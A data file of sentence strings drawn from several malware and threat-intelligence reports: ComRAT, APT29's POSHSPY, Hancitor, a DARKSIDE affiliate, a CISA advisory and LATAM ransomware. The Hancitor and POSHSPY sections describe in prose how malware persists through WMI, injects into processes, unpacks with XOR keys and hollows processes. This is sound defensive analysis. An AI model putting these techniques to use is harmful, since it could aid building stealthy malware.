            "The IronPython scripts and the Windows task XML were placed in the same directory.",
            "The task file is then used to create a task which in turn starts a script when triggered.",

            "This is done with the Python Base64 module and the RijndaelManaged class from the C# cryptography namespace.",
            "The decryption key is passed as an argument to the IronPython script.",
            "The Rijndael initialization vector (IV) is stored in the script.",

            "Load() method of the C# Reflection namespace.",
            "That\u2019s possible because IronPython itself is a .NET assembly and thus its process already contains all the .NET runtime libraries. ",
            "After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.",
            "In this case, the explorer.exe was chosen.",
            "This routine to get the PID slightly differs in the IronPython scripts we found.",
            "While one script uses the C# method GetProcessesByName() to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Python os.popen() function.",
            "The output is then parsed to the targeted process ID with the help of tasklist filters.",
            "Also, some scripts filter the PID based on a Windows service name.",
            "When the PID is found, an instance of the injector assembly is created and the ComRAT payload bytes and PID are passed. ",

            "In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process. ",
            "One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.",
            "This needs some preparation in the remote process, as you cannot simply load and execute a .NET assembly there if the CLR isn\u2019t present.",
            "This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards. ",
            "There are two bootstrappers (x86/64) contained in the NetBootstrapper class, which have the following PDB paths left: F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_Win32.pdb F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_x64.pdb Just like the injector itself, the bootstrappers contain meaningful function names (exported functions) and useful log messages.",

            "title: Dissecting One of APT29\u2019s Fileless WMI and PowerShell Backdoors (POSHSPY) url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html Mandiant has observed APT29 using a stealthy backdoor that we call POSHSPY.",
            "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI).",
            "In the investigations Mandiant has conducted, it appeared that APT29 deployed POSHSPY as a secondary backdoor for use if they lost access to their primary backdoors. ",
            "POSHSPY makes the most of using built-in Windows features \u2013 so-called \u201cliving off the land\u201d \u2013 to make an especially stealthy backdoor.",
            "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.",
            "Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory.",
            "The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult.",
            "Every aspect of POSHSPY is efficient and covert. ",
            "Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015.",
            "Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence.",
            "Mandiant has since identified POSHSPY in several other environments compromised by APT29 over the past two years. ",
            "We first discussed APT29\u2019s use of this backdoor as part of our \u201cNo Easy Breach\u201d talk.",
            "For additional details on how we first identified this backdoor, and the epic investigation it was part of, see the slides and presentation. ",
            "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000.",
            "WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.",
            "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.",
            "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory. ",
            "WMI classes are the primary structure within WMI.",
            "WMI classes can contain methods (code) and properties (data).",
            "Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes. ",
            "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met.",
            "Attackers often use this functionality to persist the execution of backdoors at system start up.",
            "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.",
            "WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.",
            "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others.",
            "A FilterToConsumerBinding associates Consumers to Filters.",
            "Creating a WMI permanent event subscription requires administrative privileges on a system. ",
            "We have observed APT29 use WMI to persist a backdoor and also store the PowerShell backdoor code.",
            "To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value.",
            "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property. ",
            "APT29 then created a WMI event subscription in order to execute the backdoor.",
            "The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property.",
            "This allowed them to install a persistent backdoor without leaving any artifacts on the system\u2019s hard drive, outside of the WMI repository.",
            "This \u201cfileless\u201d backdoor methodology made the identification of the backdoor much more difficult using standard host analysis techniques. ",
            "POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis. ",
            "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time. ",
            "Figure 1: \u201cBfeOnServiceStartTypeChange\u201d WMI Query Language (WQL) filter condition ",
            "The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.",
            "The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command. ",
            "Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class.",
            "The PowerShell command contained the payload storage location and encryption keys.",
            "Figure 2 displays the command, called the \u201cCommandLineTemplate\u201d, executed by the WindowsParentalControlsMigration consumer. ",
            "Figure 2: WindowsParentalControlsMigration",
            "CommandLineTemplate Figure 3 contains the decoded PowerShell command from the \u201cCommandLineTemplate.\u201d Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here. ",
            "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.",
            "The backdoor contains several notable capabilities, including: 1.",
            "Downloading and executing PowerShell code as an EncodedCommand 2.",
            "Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension 3.",
            "Modifying the Standard Information timestamps (created, modified, accessed) of every downloaded executable to match a randomly selected file from the System32 directory that was created prior to 2013 4.",
            "Encrypting communications using AES and RSA public key cryptography 5.",

            "Appending a file signature header to all encrypted data, prior to upload or download, by randomly selecting from the file types: ICO GIF JPG PNG MP3 BMP The sample in this example used 11 legitimate domains owned by an organization located near the victim.",
            "When combined with the other options in the DGA, 550 unique C2 URLs could be generated.",
            "Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques. ",
            "Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29.",
            "By \u201cliving off the land\u201d they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even after remediation.",
            "As stealthy as POSHSPY can be, it comes to light quickly if you know where to look.",
            "Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.",
            "This is one of several sneaky backdoor families that we have identified, including an off-the-shelf domain fronting backdoor and HAMMERTOSS. ",
            "When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware. ",
            "Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment. ",
            "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics. ",

            "We cover its unpacking routine, information gathering and command and control (C2) functions, and payload execution techniques. ",
            "The malware Hancitor Hancitor (aka Chanitor) is a downloader which is used to gain initial access to a victim\u2019s computer.",
            "Its main purpose is to download and execute a second stage malware payload from one of multiple encrypted URLs contained in the malware itself.",
            "This downloader was first seen in 2014 commonly deploying Pony and Vawtrak malware.",
            "Like many other malware families we saw Hancitor become active again in early 2021 following the festive period.",
            "The first Hancitor malicious spam wave of 2021 started on 12 January, where the malware was distributed as email Word document attachments.",
            "Since then, almost every workday we have seen Hancitor activity. ",
            "Word Dropper used by Hancitor On Tuesday 12 January, phishing emails with hyperlinks leading to Word documents reached users\u2019 inboxes.",
            "The Word documents were droppers that install and execute the Hancitor downloader.",
            "When opened, the user sees a social engineering image telling them that they must click the \u201cEnable editing\u201d button to see the document\u2019s contents. ",
            "Figure 1 \u2013 Word document lure requesting the user to run the VBA macro. ",
            "Analyzing the attachment using oledump shows that not only VBA macros but also an Object Linking and Embedding (OLE) object are embedded in the document.",

            "Once the \u201c.tmp\u201d file is found, it is moved and renamed to the Office templates folder (C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Templates) as \u201cW0rd.dll\u201d and loaded using rundll32.exe.",

            "Packed DLL analysis Briefly looking at the DLL characteristics shows that there are two unknown sections, which could be an indicator of packing being used to obfuscate the malware.",
            "Opening the DLL in a debugger and running through the program, focusing on what is happening with the suspicious sections confirms that there is indeed some sort of unpacking happening. ",
            "Figure 5 \u2013 Sections of the PE file (\u201cW0rd.dll\u201d). ",
            "Although the unpacking procedure happens in multiple steps, it can be described in two broad stages: Decryption Stage 1 First, the malware allocates new memory which is used to copy the data from section \u201c.rdata4\u201d into it.",
            "The data, however, is not copied identically from the section to the new memory region because the bytes containing 0x21 are omitted.",
            "As soon as the copy operation is finished, the decryption process starts.",
            "The first four bytes at the beginning of the newly allocated memory indicate the length of the data that will be decrypted.",
            "The algorithm to decrypt the data is simple.",
            "It uses an XOR operation with the key and plaintext being incremented after each four-byte operation.",
            "To start, the key is initialized with 0xD508.",
            "A replication of this algorithm, written in Python, can be found in our GitHub repository. ",

            "Looking at the decrypted data and the behavior of the program, we can see that there are multiple areas containing different types of information.",
            "The names of Windows API functions are stored in the first 150 bytes.",
            "The area after this contains encrypted data.",

            "However, instead of being resolved within kernel32.dll, they are resolved in kernelbase.dll.",
            "This is important to note because when debugging Hancitor samples, breakpoints are most commonly set on functions from kernel32.dll and thus would not be triggered during execution.",
            "After resolving the functions, the second decryption stage occurs. ",
            "Decryption Stage 2 As indicated",
            ", the decrypted memory structure contains executable code.",
            "As expected, the instruction pointer jumps directly to this section, which also contains the decryption algorithm for the second stage.",
            "Before the decryption starts, new memory is allocated and the encrypted data from stage 1 is copied to it.",
            "The decryption algorithm of stage 2 is generally the same, but uses 0x3E9 as the initialization key.",
            "The output of this decryption leads us to a PE file. ",
            "Figure 8 \u2013 Overview of Hancitor\u2019s decryption procedure. ",
            "The copy procedure is done section by section to bring the executable into the loaded form.",
            "This technique is called self-injection or PE overwrite.",
            "To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.",
            "These function addresses vary from installation to installation, so this patching cannot be done by a static unpacker.",
            "For all the other decryption procedures described, you can find a static unpacker script in our GitHub repository.",
            "To effectively run the new payload, a return to the correct DLL entry point is made.",
            "It is important to note that the AddressOfEntryPoint in the optional header does not match the exported functions DllRegisterServer or DllUnregisterServer and it is necessary to run one of the exported functions to start the malware.",
            "When using x32dbg to analyze the sample, simply patching the AddressOfEntryPoint to one of the exported functions makes the DLL runnable. ",
            "Running Hancitor Malware As soon as the unpacked executable is running, the malware gathers information about the infected system.",
            "The following disassembly shows calls to multiple functions used to collect the information. ",
            "Figure 9 \u2013 x86 disassembly of Hancitor\u2019s information gathering function. ",
            "First, the malware calls a function we named \u201cgetComputerInfo\u201d.",
            "This function obtains the username, the computer name and the domain of infected system.",
            "The subsequent functions collect additional information such as the machine\u2019s public IP address, domain trust information and the computer architecture.",
            "The malware identifies the computer\u2019s public IP address by making a HTTP GET request to \u201chxxp://api.ipify[.]org\u201d, a free public IP address API.",
            "All the collected information is then put together into a query string which is generated based on the computer architecture. ",
            "Figure 10 \u2013 Query string containing system information before being sent to the C2. ",
            "To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm to get a list of potential C2 URLs. ",
            "Figure 11 \u2013 URL and build decryption function. ",
            "After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.",
            "To increase the probability of reaching an active server, the malware iterates over all the decrypted C2 URLs and tries to reach all of them until one of them sends a response. ",
            "Figure 12 \u2013 C2 communication function. ",
            "We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.",
            "Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.",
            "If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.",
            "To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method \u201cCreate Process\u201d is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with \u201cstart\u201d as the argument for the entry function. ",
            "Create Thread The Create Thread method is as straightforward as Create Process.",
            "The malware simply allocates some memory, writes the malware into it and creates a new thread from it. ",
            "Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.",
            "The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread. ",
            "Figure 13 \u2013 Process creation function. ",
            "Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.",
            "This method is mostly the same as the above described Process Injection method.",
            "The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards. ",
            "Conclusion This article should give a good overview of Hancitor\u2019s capabilities and behavior as of February 2021. Indicators of Compromise (IOCs) ",

            "While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk. ",
            "As reported in the Mandiant post, \"Shining a Light on DARKSIDE Ransomware Operations,\" Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates.",
            "UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020. ",
            "The intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program (Mandiant Advantage background).",
            "While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will. ",
            "Sometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website. ",
            "Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones. ",
            "While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness.",
            "Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers.",
            "A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company\u2019s software; in this case, an installer, rather than the software itself, was modified by UNC2465. ",
            "DARKSIDE RaaS In mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service.",
            "This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service.",
            "The post cited law enforcement pressure and pressure from the United States for this decision. ",
            "Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate.",
            "There are some actors who have speculated that the DARKSIDE operator\u2019s decision to close could be an exit scam.",
            "While we have not seen evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations. ",
            "Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month.",
            "Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services.",
            "As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service.",
            "Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future. ",
            "Background In June 2021, Mandiant Consulting was engaged to respond to an intrusion.",
            "During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. ",
            "Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020. ",
            "On May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP.",
            "Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim\u2019s computer.",
            "Additional malware use such as BEACON, and lateral movement also occurred.",
            "Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021. ",

            "Chinese MSS-affiliated cyber threat actors use readily available exploits and exploit toolkits to quickly engage target networks. ",
            "Maintaining a rigorous patching cycle continues to be the best defense against the most frequently used attacks. ",
            "If critical vulnerabilities remain unpatched, cyber threat actors can carry out attacks without the need to develop custom malware and exploits or use previously unknown vulnerabilities to target a network. ",
            "This Advisory identifies some of the more common\u2014yet most effective\u2014TTPs employed by cyber threat actors, including Chinese MSS-affiliated cyber threat actors. ",
            "Click here for a PDF version of this report. ",
            "Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People\u2019s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks. ",
            "According to a recent U.S. Department of Justice indictment, MSS-affiliated actors have targeted various industries across the United States and other countries\u2014including high-tech manufacturing; medical device, civil, and industrial engineering; business, educational, and gaming software; solar energy; pharmaceuticals; and defense\u2014in a campaign that lasted over ten years.[1]",
            "These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents\u2019 names and extensions (e.g., from \u201c.rar\u201d to \u201c.jpg\u201d) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks\u2019 \u201crecycle bins.\u201d",
            "The defendants frequently returned to re-victimize companies, government entities, and organizations from which they had previously stolen data, in some cases years after the initial successful data theft.",
            "In several instances, however, the defendants were unsuccessful in this regard, due to the efforts of the FBI and network defenders. ",
            "The continued use of open-source tools by Chinese MSS-affiliated cyber threat actors highlights that adversaries can use relatively low-complexity capabilities to identify and exploit target networks.",
            "In most cases, cyber operations are successful because misconfigurations and immature patch management programs allow actors to plan and execute attacks using existing vulnerabilities and known exploits.",
            "Widespread implementation of robust configuration and patch management programs would greatly increase network security.",
            "It would also reduce the speed and frequency of opportunistic attacks by forcing threat actors to dedicate time and funding to research unknown vulnerabilities and develop custom exploitation tools. ",
            "MITRE PRE-ATT&CK:registered: Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK:registered: Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations.",
            "While cyber threat actors\u2019 motivations and intents are often unknown, they often make their selections based on the target network\u2019s security posture.",
            "Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet.",
            "Shodan queries can also be customized to discover specific vulnerabilities on devices, which enables sophisticated cyber threat actors to use relatively unsophisticated techniques to execute opportunistic attacks on susceptible targets. ",
            "The CVE database and the NVD contain detailed information about vulnerabilities in applications, appliances, and operating systems that can be exploited by cyber threat actors if they remain unpatched.",
            "These sources also provide risk assessments if any of the recorded vulnerabilities are successfully exploited. ",
            "These information sources have legitimate uses for network defense.",
            "CISA analysts are able to identify Federal Government systems that may be susceptible to exploitation attempts by using Shodan, the CVE database, and the NVD to enrich NCPS information.",
            "Unlike threat actors, CISA takes the necessary actions to notify network owners of their exposure in order to prevent an impending intrusion or quickly identify intrusions as they occur. ",
            "While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable.",
            "This correlation suggests that cyber threat actors also rely on Shodan, the CVE database, the NVD, and other open-source information to identify targets of opportunity and plan cyber operations.",
            "Together, these data sources provide users with the understanding of a specific vulnerability, as well as a list of systems that may be vulnerable to attempted exploits.",
            "These information sources therefore contain invaluable information that can lead cyber threat actors to implement highly effective attacks. ",

            "title: Latin American Governments Targeted By Ransomware url: https://www.recordedfuture.com/latin-american-governments-targeted-by-ransomware Recorded Future examined the recent escalation of cyberattacks on Latin American (LATAM) governments from January 2022 until May 2022.",
            "We analyzed vulnerabilities, attack vectors, and indicators of compromise (IOCs), identified the most prevalent ransomware gangs targeting LATAM governments, and highlighted the lack of proper cybersecurity hygiene in the region.",
            "This report includes information gathered using the Recorded Future Platform, dark web sources, and open-source intelligence techniques (OSINT).Executive SummaryWe identified several government entities in Latin America (LATAM) that have been affected by ransomware attacks, likely involving Russian or Russian-speaking threat actors, beginning on or around April 2022.",
            "Countries affected include Costa Rica, Peru, Mexico, Ecuador, Brazil, and Argentina, among others, all of which have publicly condemned Russia for invading Ukraine at the United Nations General Assembly (UNGA).",
            "Some of these countries also voted to suspend Russia from the United Nations Human Rights Council (UNHRC) in early April 2022.",
            "More recently, national emergencies have been issued regarding these attacks, such as in Costa Rica.",
            "Ransomware groups involved in these attacks against governments in LATAM include Conti, ALPHV, LockBit 2.0, and BlackByte.",
            "We have anecdotally identified a noticeable increase in initial access brokerage (IAB) services on top-tier Russian-language dark web and special access forums such as XSS and Exploit advertising low-cost, compromised network access methods related to entities in LATAM.",
            "We have also observed several high-profile database leaks related to entities in LATAM on low-tier and mid-tier English-speaking forums such as BreachForums, with data dumps spiking in April 2022.",
            "Additionally, we observed a significant increase in the sale of compromised credentials affecting LATAM government domains on dark web shops in Q1 and Q2 2022, relative to 2021.",
            "These observations and trends could represent a paradigm shift in the ransomware and broader cybercriminal community related to unwritten rules and internal group policies on the targeting of government entities.",
            "Key JudgmentsThe credibility of ransomware attacks on LATAM government entities is high, based on analysis of leaked sample data, threat actor indications, and historical activities, patterns, and trends related to tracked ransomware operators and affiliates.",
            "If unaddressed, ransomware attacks on local, provincial, or federal government entities in LATAM could constitute a credible national and geopolitical security risk.",
            "Entities in LATAM will remain attractive targets for ransomware operators and affiliates, as the region lacks the proper cybersecurity education, hygiene, and infrastructure to defend against such threats.",
            "If attacks on LATAM government entities were to escalate to target infrastructure and critical services, this would pose a significant national security risk.",
            "The most likely attack vectors employed by ransomware affiliates targeting LATAM government entities include the use of compromised valid credentials obtained via infostealer infection, initial access broker sale, or purchase on a dark web shop or marketplace.",
            "The targeting of LATAM government entities could represent an initial shift away from internal cybercriminal policies on the targeting of governments worldwide.",
            "Threat AnalysisAttack VectorsAs of May 26, 2022, we can not definitively determine the attack vector employed by ransomware operators and affiliates targeting LATAM government entities.",
            "However, the most common method by which threat actors obtain initial access to networks is through the use of compromised valid credential pairs (T1078) and session cookies (T1539), which are often harvested from a successful infostealer infection (T1555, T1083) and sold by specialized initial access brokers on dark web and special-access sources.",
            "This is the most likely avenue by which such threat actors gained access to compromised LATAM government networks.",
            "These infostealers are often spread via phishing (T1566), spamming, the unintentional downloading of a malicious (T1204) or masquerading (T1036) file, and various other methods.",
            "We have observed a minor, sustained increase in references to initial access sales and database leaks targeting LATAM government entities on dark web and special-access sources, beginning in approximately March 2022.",
            "These observations are recorded anecdotally via Insikt Groups daily threat leads, analyst notes, and reports.",
            "We have observed several threat actors, such as zirochka, on top-tier Russian-language forums XSS and Exploit auctioning compromised network accesses targeting entities in LATAM in bulk for relatively low prices (< $100).Figure 1: Timeline of ransomware attacks on LATAM government entities, mapped to references to LATAM on dark web and special-access sources (Source: Recorded Future)We have observed a slight increase in database dumps related to LATAM government entities, beginning in March 2022 and spiking on April 4, 2022.",
            "We have also identified a significant increase in Q1 2022, beginning in February 2022, of references to domains owned by government entities in LATAM on dark web shops and marketplaces such as Russian Market, Genesis Store, and 2easy Shop, relative to the same time period in 2021.",
            "These dark web shops and marketplaces specialize in the sale of compromised account credentials, remote desktop protocol (RDP) and secure shell (SSH) accesses, and infostealer malware logs that can be utilized to gain access to a victims network.",
            "While we cannot determine any direct or causal link between the increased supply, frequency, and volume of advertisements targeting government entities and domains in LATAM to ransomware attacks targeting LATAM government entities, we believe that such trends and observations warrant further research to analyze and determine any possible correlation.",
            "Figure 2: Examples of bulk initial access auctions targeting unspecified entities in LATAM (Source: Exploit Forum)Ransomware Gangs Targeting LATAM Government EntitiesWe have observed at least 4 high-credibility ransomware gangs targeting LATAM government entities during a period of time beginning on April 1, 2022.",
            "These gangs include Conti, ALPHV (BlackCat), LockBit 2.0, and BlackByte.",
            "These incidents constitute a significant escalation in the severity and impact of ransomware targeting.",
            "Generally, ransomware affiliates avoid targeting healthcare facilities, K-12 educational institutions, international organizations and coalitions, and local, provincial, or federal governments.",
            "The risk of negative publicity and stigmatization on dark web and special-access forums, mainstream media attention, and international law enforcement activity increases dramatically once targets in these industries are attacked.",
            "It is possible that the targeting of LATAM entities by presumably Russian or Russian-speaking ransomware gangs could mark the beginning of a paradigm shift in which targets that were previously internally sanctioned by the group could now become viable targets for ransomware operations.",
            "ContiThe most noteworthy of these targets is the attack on the government of Costa Rica by Conti, which resulted in the worlds first nationwide emergency declared as the result of a ransomware attack.",
            "The attack, likely perpetrated and publicized by ransomware affiliate or affiliate group unc1756, also likely known as wazawaka, has garnered widespread media and law enforcement attention.",
            "Since affiliates often work independently from the larger ransomware brand, it is possible that the attacks on Costa Rica that were claimed by Conti are not the work of the larger group.",
            "Conti has claimed to have exfiltrated, encrypted, or destroyed approximately 1TB of sensitive information related to the administration and operations of several Costa Rican entities including the Ministry of Finance (hacienda[.]go[.]cr), the Ministry of Labor and Social Security (mtss[.]go[.]cr), the Development Fund and Family Allowances Bureau (fodesaf[.]go[.]cr), and the Interuniversity Headquarters of Alajuela, Costa Rica (siua[.]ac[.]cr).",
            "Previous Conti posts also made vague references to controlling public utilities such as water and electricity, likely indicating indirectly that the group had access to Costa Rican industrial control system / supervisory control and data acquisition (ICS/SCADA) environments.",
            "However, we are not able to verify these claims.",
            "Conti followed their claims of an attack on Costa Rica with an attack on Peru that affected the General Directorate of Intelligence (digimin[.]gob[.]pe) and Ministry of Economics and Finance (mef[.]gob[.]pe).Figure 3: Announcements of attacks on Costa Rican and Peruvian government entities by the Conti Gang (Source: Conti.News)ALPHV (BlackCat)On April 16, 2022, the ransomware gang ALPHV (BlackCat) leaked an unspecified amount of compromised data related to the Municipality of Quito, Ecuador (quito[.]gob[.]ec).",
            "This marked the first time that ALPHV targeted a government entity located in LATAM.",
            "According to Ecuadorian media, this attack took several services offline for an unspecified amount of time.",
            "This is a noteworthy event, as the Mayors Office of Municipality of Quito and State Attorney Generals Office confirmed that the initial attack caused the suspension of several critical government services, which caused an inconvenience to users who have not been able to carry out procedures.",
            "As of April 25, 2022, all of the information claimed to have been exfiltrated by ALPHV is available to download for free on a .onion domain provided on the public-facing ALPHV extortion website with the same name.",
            "Compromised information likely includes sensitive financial, legal, and political documents related to the operations and administration of the Municipality of Quito, Ecuador.",
            "This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to Ecuadors national security.",
            "Figure 4: Announcements of an attack on the Municipality of Quito, Ecuador from the BlackCat Ransomware Group (Source: ALPHV)LockBit",
            "2.0On May 23, 2022, the LockBit 2.0 ransomware gang published to their blog leaked files related to the Secretary of Health of the State of Morelos, Mexico (saludparatodos[.]ssm[.]gob[.]mx), a breach that was initially disclosed on or around May 16, 2022.",
            "This disclosure followed a previous claim on April 22, 2022 that LockBit 2.0 had compromised the network of the Secretary of State for Finance of Rio De Janeiro, Brazil (fazenda[.]rj[.]gov[.]br).",
            "Neither of these incidents were widely reported in either Mexican or Brazilian media.",
            "As of April 25, 2022, it is unclear whether the attacks resulted in a significant disruption of critical services related to the government entities.",
            "Additionally, also as of April 25, 2022, all of the information claimed to have been exfiltrated by the LockBit 2.0 ransomware gang is available to download for free on the public-facing LockBit 2.0 extortion website called LockBit 2.0 Leaked Data.",
            "The compromised information likely includes sensitive financial, legal, and political documents related to the operations and administration of these entities.",
            "This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to the national security of Mexico and Brazil.",
            "Figure 5: Announcements of attacks on Mexican and Brazilian government entities by the LockBit Gang (Source: LockBit Blog)BlackByteOn May 21, 2022, the BlackByte ransomware operators published claims on their public-facing extortion website named BlackByte Blog that they had compromised the internal network of the Comptroller General of the Republic of Peru (contraloria[.]gob[.]pe).",
            "As of April 25, 2022, the BlackByte ransomware operators have not published any noteworthy data related to this government entity.",
            "This attack has yet to be confirmed by any representatives of the Comptroller General of Peru and has not been extensively reported on in Peruvian or Spanish-language media.",
            "As of this writing, we cannot determine if this attack caused the disruption of critical services provided by the comptroller general, although it is likely that any detected service disruptions on the domain are related to this attack.",
            "Figure 6: Announcement of an attack on a Peruvian government entity by the BlackByte Ransomware Gang (Source: BlackByte Blog)Cybersecurity Hygiene and Trends in Latin AmericaAlthough most countries in LATAM have adopted a national cybersecurity strategy, there is still much work yet to be done in terms of improving the cyber capacity and security posture in both the private and public sectors; at the moment, only 3 LATAM countries (Brazil, the Dominican Republic, and Mexico) are members of the 30-plus-country ransomware task force.",
            "The most effective investment would be to give residents in LATAM and the Caribbean in-person or remote access to IT security-oriented schools and training institutions.",
            "Educational and training institutions in the region simply cannot keep up with the current demand for IT security professionals.",
            "Investments in education, training, and apprenticeship programs would make the most difference in building capacity, closing the cyber skills gap, and getting more individuals into the cyber talent pipeline.",
            "Supporting and encouraging younger individuals to seek an education and training within the cyber realm can drastically affect the skills shortage and improve public awareness on cyber threats; the region has been particularly affected by cybercrime and fraud during the pandemic.",
            "While it is difficult to evaluate countries given their alternative approaches to cybersecurity, some have decided to leave cybersecurity to private firms while others have leaned on government agencies and the military to combat cybercriminals.",
